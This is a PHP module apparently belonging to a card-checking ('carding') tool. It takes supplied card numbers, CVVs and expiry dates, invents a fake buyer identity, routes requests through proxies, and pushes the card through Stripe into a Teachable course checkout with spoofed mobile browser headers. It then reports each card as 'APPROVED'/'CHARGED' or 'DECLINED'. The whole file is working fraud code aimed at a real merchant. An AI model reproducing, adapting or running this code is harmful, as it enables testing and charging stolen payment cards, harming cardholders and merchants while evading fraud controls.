<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'type=card&billing_details[name]='.$fake->first.'+'.$fake->last.'&billing_details[email]='.urlencode($fake->email).'&billing_details[address][postal_code]=10509&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F1104f1bb4%3B+stripe-js-v3%2F1104f1bb4&time_on_page='.rand(50000, 100000).'&key=pk_live_hkgvgSBxG4TAl3zGlXiB1KUX';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/payment_methods', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

$pm = $json_r1->id;

$r2 = $this->curlx->Get('https://sso.teachable.com/secure/1530166/checkout/4588468/how-to-survive-in-minecraft-preview-course', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$csrf = trim(strip_tags($this->getstr($r2->body, 'csrf-token" content="', '"')));

$order = trim(strip_tags($this->getstr($r2->body, 'data-order-token="', '"')));

$checkout = trim(strip_tags($this->getstr($r2->body, 'data-checkout="https://sso.teachable.com/secure/1530166/checkout/', '/')));

if (empty($csrf) || empty($order) || empty($checkout)) {
	$empty = 'Second Request Tokens are Empty';

	goto start;
}

$data = '{"email":"'.$fake->email.'"}';

$headers = [
	'authority: sso.teachable.com',
	'accept: application/json',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json;charset=UTF-8',
	'origin: https://sso.teachable.com',
	'referer: https://sso.teachable.com/secure/1530166/checkout/'.$checkout.'/how-to-survive-in-minecraft-preview-course',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'x-csrf-token: '.$csrf.'',
	'x-from-our-app: true',
	'x-test-version: undefined'
];

$r3 = $this->curlx->Custom('https://sso.teachable.com/secure/1530166/student_checkout/'.$order.'/accounts/verify_email.json', 'PATCH', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$data = '{"stripe_payment_method_id":"'.$pm.'","country_code":"US"}';

$headers = [
	'authority: sso.teachable.com',
	'accept: application/json',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json;charset=UTF-8',
	'origin: https://sso.teachable.com',
	'referer: https://sso.teachable.com/secure/1530166/checkout/'.$checkout.'/how-to-survive-in-minecraft-preview-course',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'x-csrf-token: '.$csrf.'',
	'x-from-our-app: true',
	'x-test-version: undefined'
];

$r4 = $this->curlx->Post('https://sso.teachable.com/secure/1530166/student_checkout/'.$order.'/confirm/credit_card.json', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$json_r4 = json_decode($r4->body);

$msg = $json_r4->errors[0]->code ?? '';

if (isset($json_r4->errors[0])) {
	$err = $json_r4->errors[0];

	$error = (object) [
		'code' => $err->meta->stripeErrorCode ?? $err->code ?? '',
		'decline_code' => $err->meta->stripeErrorDeclineCode ?? null,
		'message' => $err->detail
	];

	$status = $this->response->ErrorHandler($error);

	goto end;
}

if (isset($json_r4->redirect_to)) {
	do {
		$headers = [
			'authority: sso.teachable.com',
			'accept: application/json',
			'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
			'if-none-match: W/"a0e7580ac74403ac7f26d92ba75c556a"',
			'referer: https://sso.teachable.com/secure/1530166/checkout/'.$checkout.'/how-to-survive-in-minecraft-preview-course',
			'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
			'sec-ch-ua-mobile: ?1',
			'sec-ch-ua-platform: "Android"',
			'sec-fetch-dest: empty',
			'sec-fetch-mode: cors',
			'sec-fetch-site: same-origin',
			'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
			'x-csrf-token: '.$csrf.'',
			'x-from-our-app: true',
			'x-test-version: undefined'
		];

		$r5 = $this->curlx->Get('https://sso.teachable.com/secure/1530166/student_checkout/'.$order.'/check.json', $headers, $cookie, $server['proxy']);
	} while (strpos($r5->body, '"wait":true') !== false);

	if (strpos($r5->body, 'completed_order":true') !== false) {
		$status = ['emoji' => '✅', 'status' => 'APPROVED', 'msg' => "CHARGED - Completed Order -> True!"];

		goto end;
	}

	$r4 = $r5;

	$json_r4 = json_decode($r4->body);

	if (isset($json_r4->errors[0])) {
		$err = $json_r4->errors[0];

		$msg = ''.(isset($err->detail) ? $err->detail.'.' : '').''.(isset($err->code) ? ' ('.$err->code.')' : '');
	}
}

$status = $this->response->Stripe($r4->body, $msg);

end: